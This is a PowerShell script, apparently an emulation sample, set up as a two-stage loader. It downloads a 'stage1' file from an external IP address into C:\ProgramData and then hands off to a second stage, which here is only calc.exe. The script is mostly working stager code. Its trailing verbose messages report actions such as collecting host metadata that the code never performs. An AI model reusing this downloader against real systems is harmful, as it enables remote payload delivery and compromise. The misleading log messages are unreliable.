
[CmdletBinding()]
param(
    [string]$FetchUrl = 'https://198.51.100.222/stage1.ps1',
    [string]$PayloadPath = "C:\ProgramData\stage1.bin",
    [string]$StageLog = "$env:TEMP\transfer.log",
    [int]$RequestTimeout = 74
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 74
    )

    Write-Verbose ("Downloading first stage from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    if (-not (Test-Path -Path $DestinationPath)) {
        throw "First stage was not written to disk"
    }
    return $DownloadedPath = $DestinationPath
}

function Invoke-Stage2Execution {
    param(
        [string]$StagedPath = "",
        [int]$DelaySeconds = 2
    )

    Write-Verbose ("Preparing handoff for " + $StagedPath)
    Start-Sleep -Seconds $DelaySeconds
    Start-Process -FilePath "calc.exe"
    Write-Verbose "Second stage handoff complete"
    return $true
}

Write-Verbose "Starting multi-stage workflow"
$StageResult = Invoke-Stage1Download -SourceUrl $FetchUrl -DestinationPath $PayloadPath -TimeoutSec $RequestTimeout
if ($StageResult) {
    $HandoffResult = Invoke-Stage2Execution -StagedPath $PayloadPath
    Write-Verbose ("Handoff result: " + $HandoffResult)
}
else {
    Write-Warning "First stage did not complete"
}

$StageSummary = [ordered]@{
    Stage1 = "download"
    Stage2 = "handoff"
    Endpoint = $FetchUrl
    Destination = $PayloadPath
    TimeoutSec = $RequestTimeout
}
$StageSummary | ConvertTo-Json -Depth 3 | Out-File -FilePath $StageLog -Append
Write-Verbose "Starting workflow"
Write-Verbose "Inspecting process list"
Write-Verbose "Checking local path"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Reading configuration values"
Write-Verbose "Operation completed"
Write-Verbose "Resolving configured target"
Write-Verbose "Validating result"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Stage handoff finished"
Write-Verbose "Collecting host metadata"
Write-Verbose "Exporting operation report"
$ProgressPreference = "SilentlyContinue"
